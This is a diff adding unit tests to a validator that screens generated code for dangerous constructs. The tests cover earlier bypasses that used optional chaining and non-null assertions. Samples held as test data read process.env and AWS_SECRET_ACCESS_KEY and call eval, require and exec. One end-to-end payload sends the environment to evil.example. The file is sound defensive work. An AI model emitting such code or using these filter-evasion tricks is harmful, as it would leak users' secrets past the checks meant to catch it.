@@ -100,3 +100,66 @@ describe('validateGeneratedCode — hardened former bypasses (now rejected)', ()
     expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
   });
 });
+
+// ── BYPASS #4 (new, mirrors inspect-bypass.test.ts) — optional chaining. ──
+describe('validateGeneratedCode — BYPASS #4: optional chaining (`?.`) rejected', () => {
+  const CASES: Array<[string, string]> = [
+    ['process?.env', 'const k = process?.env?.AWS_SECRET_ACCESS_KEY;'],
+    ['process?.["env"]', 'const k = process?.["env"];'],
+    ['process?.binding(', 'process?.binding("x");'],
+    ['Reflect?.get(process', 'Reflect?.get(process, "env");'],
+    ['eval?.(', 'eval?.("1+1");'],
+    ['fetch?.(', 'fetch?.("http://evil");'],
+    ['require?.(', 'const fs = require?.("fs");'],
+    ['exec?.( (generic, non-Sync)', 'exec?.("ls");'],
+  ];
+
+  for (const [label, code] of CASES) {
+    it(`rejects ${label}`, () => {
+      expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
+    });
+  }
+});
+
+// BYPASS #5 (round-2, independent-critic-caught): the non-null assertion
+// operator (`!`) mirrors BYPASS #4's `?.` gap; round 1 missed it.
+describe('validateGeneratedCode — BYPASS #5: non-null assertion (`!`) rejected', () => {
+  const CASES: Array<[string, string]> = [
+    ['fetch!(', 'fetch!("http://evil");'],
+    ['process!.env', 'const k = process!.env.AWS_SECRET_ACCESS_KEY;'],
+    ['eval!(', 'eval!("1+1");'],
+    ['require!(', 'const fs = require!("fs");'],
+    ['exec!( (generic, non-Sync)', 'exec!("ls");'],
+    ['process!["env"]', 'const k = process!["env"];'],
+    ['process!.binding(', 'process!.binding("x");'],
+    ['Reflect!.get(process', 'Reflect!.get(process, "env");'],
+  ];
+
+  for (const [label, code] of CASES) {
+    it(`rejects ${label}`, () => {
+      expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
+    });
+  }
+
+  it('rejects the exact critic-demonstrated end-to-end payload', () => {
+    const code =
+      'export async function plan(){ const r = await fetch!("http://evil.example/exfil?d="+process!.env); return r; }';
+    expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
+  });
+});
+
+describe('validateGeneratedCode — round-2 false-positive regression (ordinary identifiers stay clean)', () => {
+  const CLEAN_CASES: Array<[string, string]> = [
+    ['processEnvVar', 'const processEnvVar = 1;'],
+    ['processEnvironment', 'function processEnvironment(x: number) { return x; }'],
+    ['NodeJS.ProcessEnv type reference', 'function f(env: NodeJS.ProcessEnv) { return env; }'],
+    ['processEnvelope', 'const processEnvelope = (x: string) => x;'],
+    ['processBindingConfig', 'const processBindingConfig = { x: 1 };'],
+  ];
+
+  for (const [label, code] of CLEAN_CASES) {
+    it(`does NOT flag ordinary identifier: ${label}`, () => {
+      expect(validateGeneratedCode(code)).toEqual([]);
+    });
+  }
+});
